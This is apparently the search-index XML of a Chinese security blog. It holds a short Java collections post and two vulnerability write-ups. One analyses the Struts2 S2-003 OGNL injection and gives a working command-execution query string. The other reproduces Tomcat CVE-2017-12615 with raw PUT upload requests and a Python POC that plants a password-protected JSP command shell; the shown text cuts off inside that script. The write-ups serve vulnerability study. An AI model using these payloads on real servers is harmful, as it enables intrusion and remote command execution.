<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>JAVA高级类使用技巧</title>
      <link href="/JAVA%E9%AB%98%E7%BA%A7%E7%B1%BB%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/JAVA%E9%AB%98%E7%BA%A7%E7%B1%BB%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1、高级类定义"><a href="#1、高级类定义" class="headerlink" title="1、高级类定义"></a>1、高级类定义</h2><p>&ensp;&ensp;&ensp;非专用对象，比如像IO操作、多线程操作、网络编程、GUI操作等等，都有专门作用的API，或者想打印机都属于专用API。除此之谓的公共性质的对象，称之为高级对象<br>&ensp;&ensp;&ensp;比如：字符串操作、正则表达式、集合类、日期处理、数值处理等等，都算高级类应用</p><h2 id="2、字符串"><a href="#2、字符串" class="headerlink" title="2、字符串"></a>2、字符串</h2><ul><li>String：不可变序列</li><li>StringBuilder：可变序列，线程不安全</li><li>StringBuffer：可变序列，线程安全</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">StringBuffer str = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        str.append(<span class="string">"1234"</span>);</span><br></pre></td></tr></table></figure><h2 id="3、Set-HashSet-TreeSet"><a href="#3、Set-HashSet-TreeSet" class="headerlink" title="3、Set,HashSet,TreeSet"></a>3、Set,HashSet,TreeSet</h2><ul><li>特点：不按add顺序、不可重复</li><li>不可重复的判断标准：hashcode相等，并且equals相等。<br>   hashcode对hash结构的数据存储的性能影响巨大。</li><li>TreeSet:是按加入值的自然序排序，当然你可以实现comparator接口来实现自定义排序。</li><li>HashSet底层是数组结构，借助Hashmap来实现。TreeSet底层是链表结构，它是借助TreeMap.</li><li>Set本质就是一个value=null或者是不变值的map。<br>（以上两者均是线程不安全）</li></ul><h2 id="4、List-ArrayList-LinkedList及Vector"><a href="#4、List-ArrayList-LinkedList及Vector" class="headerlink" title="4、List,ArrayList,LinkedList及Vector"></a>4、List,ArrayList,LinkedList及Vector</h2><ul><li>List的特点：加入有序、可重复。</li><li>可重复的判定标准：是否equals为唯一判断标准</li><li>ArrayList:底层是数组，遍历快、随机按下标访问快，但是删除元素肯定是慢的。</li><li>LinkedList：底层是链表，删除快，但遍历慢。</li><li>Vector: arrayList的前身，主要区别在于它是线程安全的。<br>  ArrayList和LinkedList都是线程不安全的。</li></ul><h2 id="5、Map-HashMap及HashTable"><a href="#5、Map-HashMap及HashTable" class="headerlink" title="5、Map,HashMap及HashTable"></a>5、Map,HashMap及HashTable</h2><ul><li>Map的特点：键值对形式。</li><li>HashMap的底层是数组，TreeMap的底层是链表。</li><li>HashTable：是线程安全的HashMap。</li></ul><hr><h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><p><code>内存泄露</code>：程序运行过程中，出现了不可被回收，但又永久占空间的内存地址。以HashSet为例，底层为数组。</p><p><code>线程安全</code>：线程安全和不安全的唯一判别标准：在访问对象内部有没有可能被两个线程同时访问的非局部变量。像ArrayList,LinkedList,HashSet，HashTable，HashMap等等</p><p><code>性能</code>:<br>1、当字符串频繁变化长度时，应用StringBuilder或StringBuffer<br>2、关于集合类，能用数组不要用集合，能用Set就不要用Map</p>]]></content>
      
      <categories>
          
          <category> 编程学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2-003远程代码执行漏洞分析</title>
      <link href="/Struts2-003%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Struts2-003%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a>1.漏洞信息</h2><p><strong>官方链接</strong>：<a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p><p><strong>官方概述</strong>：XWork ParameterInterceptors bypass allows OGNL statement execution</p><p><strong>影响版本</strong>：Struts 2.0.0 - Struts 2.0.11.2</p><p><strong>修复摘要</strong>：Developers should immediately upgrade to Struts 2.0.12 or upgrade to XWork 2.0.6</p><h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h2><p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过<code>#</code>来访问struts的对象，Struts2框架虽然过滤了<code>#</code>来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</p><h2 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h2><p><strong>下载 Struts2.0.11.2</strong>：<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.11.2-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.11.2-all.zip</a></p><h3 id="3-1-目录结构"><a href="#3-1-目录结构" class="headerlink" title="3.1 目录结构"></a>3.1 <strong>目录结构</strong></h3><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fuezr5mglpj30h20lm0v5.jpg" alt=""></p><h3 id="3-2-引用的包"><a href="#3-2-引用的包" class="headerlink" title="3.2 引用的包"></a>3.2 <strong>引用的包</strong></h3><ul><li>commons-logging-1.0.4.jar</li><li>freemarker-2.3.8.jar</li><li>ognl-2.6.11.jar</li><li>struts2-core-2.0.11.2.jar</li><li>xwork-2.0.5.jar</li></ul><h3 id="3-3-相关文件"><a href="#3-3-相关文件" class="headerlink" title="3.3 相关文件"></a>3.3 相关文件</h3><p><strong>index.jsp</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;S2-003&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-003 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-003"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-003&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">&lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">&lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">&lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><strong>welcome.jsp</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><strong>struts.xml</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">    <span class="string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line">    <span class="string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span>&gt;</span><br><span class="line">&lt;struts&gt;</span><br><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">"S2-003"</span> extends=<span class="string">"struts-default"</span>&gt;</span><br><span class="line">&lt;action name=<span class="string">"login"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"com.demo.action.LoginAction"</span>&gt;</span><br><span class="line">&lt;result name="success"&gt;welcome.jsp&lt;/result&gt;</span><br><span class="line">&lt;result name="error"&gt;index.jsp&lt;/result&gt;</span><br><span class="line">&lt;/action&gt;</span><br><span class="line">&lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure></p><p><strong>com.demo.action.LoginAction.java</strong><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.username = username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.password = password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">&amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>web.xml</strong><br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;web-app xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> xsi:schemaLocation=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> id=<span class="string">"WebApp_ID"</span> version=<span class="string">"3.1"</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;display-name&gt;S2-003 Example&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">org</span>.<span class="title">apache</span>.<span class="title">struts2</span>.<span class="title">dispatcher</span>.<span class="title">FilterDispatcher</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">struts2</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/*&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">welcome</span>-<span class="title">file</span>-<span class="title">list</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">welcome</span>-<span class="title">file</span>&gt;<span class="title">index</span>.<span class="title">jsp</span>&lt;/<span class="title">welcome</span>-<span class="title">file</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">welcome</span>-<span class="title">file</span>-<span class="title">list</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">web</span>-<span class="title">app</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h2><p>这里需要提示一下，一定要在<a href="https://archive.apache.org/dist/tomcat/tomcat-6/v6.0.20/bin/apache-tomcat-6.0.20.zip" target="_blank" rel="noopener">Tomcat6</a>下测试。Tomcat7及以上版本传入特殊版本会报错，如下图所示</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fueygklilvj31kw08541t.jpg" alt=""></p><p>在动态调试之前，首先要先了解下OGNL表达式中三个符号(%，#，$)的一些含义</p><ul><li><code>%</code>的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值</li><li><code>#</code>的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</li><li><code>$</code>主要是在Struts 2配置文件中，引用OGNL表达式</li></ul><p>我们和001调试的位置一样，在<code>setParameters</code>处打断点</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fuf1c3nejzj31kw0d7afb.jpg" alt=""></p><p>跟进<code>xwork-2.0.5.jar!com/opensymphony/xwork2/interceptor/ParametersInterceptor</code></p><p>这里获取到传入的值，赋值到<code>acceptableName</code><br><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fuf435qhg4j31kw0fn420.jpg" alt=""></p><p>跟进<code>acceptableName</code></p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fuf440obzcj31kw03gwfq.jpg" alt=""></p><p>继续跟进<code>isAccepted(name)</code>，这里主要是检测我们的参数名中是否包含<code>=</code> <code>,</code> <code>#</code> <code>:</code>，来防止传入恶意特殊字符开头如#等。如果参数名匹配到这几个字符，<code>acceptableName</code>就会返回false，下面的ognl表达式就不会执行。</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fuf4558b7tj31kw0snqhj.jpg" alt=""></p><p>所以我们构造payload时，使用unicode为<code>\u0023</code>来代替<code>#</code>，来绕过匹配的内容，这样<code>acceptableName</code>就会返回true，从而进一步执行。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fuf475gw0dj31kw0n47h0.jpg" alt=""></p><p>跟进<code>xwork-2.0.5.jar!com/opensymphony/xwork2/util/OgnlValueStack.class</code>进入到<strong>setValue</strong>方法</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fuf4c2uw4lj31kq03aq47.jpg" alt=""></p><p>继续跟进，可以看到expr的内容传入到OgnlUtil.setValue()中</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fuf4dng30dj31kw0jnn23.jpg" alt=""></p><p>跟进<code>xwork-2.0.5.jar!com/opensymphony/xwork2/util/OgnlUtil.class</code>,可以看到最终payload包含的<code>#</code>,经过unicode编码绕过后,赋值给o，最终作为OGNL表达式来执行</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fuf4lo5cs4j31k80e441x.jpg" alt=""></p><h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h2><p><strong>POC：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;(<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(kxlzx)(kxlzx)&amp;(<span class="string">'\u0023mycmd\u003d\'ifconfig\''</span>)(bla)(bla)&amp;(<span class="string">'\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)'</span>)(bla)(bla)&amp;(A)((<span class="string">'\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())'</span>)(bla))&amp;(B)((<span class="string">'\u0023myres\u003dnew\40byte[51020]'</span>)(bla))&amp;(C)((<span class="string">'\u0023mydat.readFully(\u0023myres)'</span>)(bla))&amp;(D)((<span class="string">'\u0023mystr\u003dnew\40java.lang.String(\u0023myres)'</span>)(bla))&amp;(<span class="string">'\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()'</span>)(bla)(bla)&amp;(E)((<span class="string">'\u0023myout.getWriter().println(\u0023mystr)'</span>)(bla))</span><br></pre></td></tr></table></figure><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fuey79waguj31kw0t3qjc.jpg" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-003</a></li><li><a href="https://xz.aliyun.com/t/2323" target="_blank" rel="noopener">https://xz.aliyun.com/t/2323</a></li><li><a href="https://03i0.com/2018/04/08/S2-003%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://03i0.com/2018/04/08/S2-003%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行漏洞 </tag>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> Struts-003 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Apache Tomcat 远程代码执行漏洞复现（CVE-2017-12615）</title>
      <link href="/Apache-Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-12615%EF%BC%89/"/>
      <url>/Apache-Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
      <content type="html"><![CDATA[<h2 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1. 漏洞信息"></a>1. 漏洞信息</h2><p>漏洞编号：CVE-2017-12615</p><p>漏洞名称：CVE-2017-12615-远程代码执行漏洞</p><p>影响版本：Apache Tomcat 7.0.0 - 7.0.81</p><p>漏洞描述：</p><p>  当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p><p>测试平台：Windows</p><p>测试环境：Tomcat 7.0.72</p><h2 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2. 漏洞验证"></a>2. 漏洞验证</h2><h3 id="2-1-安装Tomcat"><a href="#2-1-安装Tomcat" class="headerlink" title="2.1 安装Tomcat"></a>2.1 安装Tomcat</h3><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw93ipazscj31fv0e977l.jpg" alt=""></p><h3 id="2-2-初始化参数"><a href="#2-2-初始化参数" class="headerlink" title="2.2 初始化参数"></a>2.2 初始化参数</h3><p>修改Tomcat 7.0/conf/web.xml文件，添加readonly属性，将 readonly 初始化参数由默认值设置为 false，重启Tomcat，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw93jk6n7xj313a0d641m.jpg" alt=""></p><h3 id="2-3-任意文件上传"><a href="#2-3-任意文件上传" class="headerlink" title="2.3 任意文件上传"></a>2.3 任意文件上传</h3><p><strong> payload1：</strong></p><blockquote><p>PUT /111.jsp::$DATA HTTP/1.1<br>Host: 127.0.0.1:8080<br>User-Agent: JNTASS<br>DNT: 1<br>Connection: close<br>…jsp shell…</p></blockquote><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw93l0dge4j30xh0boacu.jpg" alt=""></p><p><strong> payload2(可攻击Tomcat 7.0.81)：</strong></p><p>思路：可以上传jSp文件(但不能解析)，却不可上传jsp。 说明tomcat对jsp是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 test.jsp/ 识别为非jsp文件，而后续保存文件的时候，文件名不接受/字符，故而忽略掉。</p><blockquote><p>PUT /222.jsp/ HTTP/1.1<br>Host: 127.0.0.1:8080<br>User-Agent: JNTASS<br>DNT: 1<br>Connection: close<br>…jsp shell…</p></blockquote><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fw93m11152j30xj0c4mzn.jpg" alt=""></p><h2 id="3-写入成功"><a href="#3-写入成功" class="headerlink" title="3. 写入成功"></a>3. 写入成功</h2><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fw93mf5mmpj310w08g3zb.jpg" alt=""></p><h2 id="4-POC参考-猎户实验室"><a href="#4-POC参考-猎户实验室" class="headerlink" title="4. POC参考(猎户实验室)"></a>4. POC参考(猎户实验室)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">body = <span class="string">'''&lt;%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span></span><br><span class="line"><span class="string">+"\\n");&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if("023".equals(request.getParameter("pwd"))&amp;&amp;!"".equals(request.getParameter("cmd")))&#123;out.println("&lt;pre&gt;"+excuteCmd(request.getParameter("cmd"))+"&lt;/pre&gt;");&#125;else&#123;out.println(":-)");&#125;%&gt;'''</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line">    conn.request(method=<span class="string">'OPTIONS'</span>, url=<span class="string">'/ffffzz'</span>)</span><br><span class="line">    headers = dict(conn.getresponse().getheaders())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'allow'</span> <span class="keyword">in</span> headers <span class="keyword">and</span> \</span><br><span class="line">       headers[<span class="string">'allow'</span>].find(<span class="string">'PUT'</span>) &gt; <span class="number">0</span> :</span><br><span class="line">        conn.close()</span><br><span class="line">        conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line">        url = <span class="string">"/"</span> + str(int(time.time()))+<span class="string">'.jsp/'</span></span><br><span class="line">        <span class="comment">#url = "/" + str(int(time.time()))+'.jsp::$DATA'</span></span><br><span class="line">        conn.request( method=<span class="string">'PUT'</span>, url= url, body=body)</span><br><span class="line">        res = conn.getresponse()</span><br><span class="line">        <span class="keyword">if</span> res.status  == <span class="number">201</span> :</span><br><span class="line">            <span class="comment">#print 'shell:', 'http://' + sys.argv[1] + url[:-7]</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'shell:'</span>, <span class="string">'http://'</span> + sys.argv[<span class="number">1</span>] + url[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">elif</span> res.status == <span class="number">204</span> :</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'file exists'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span 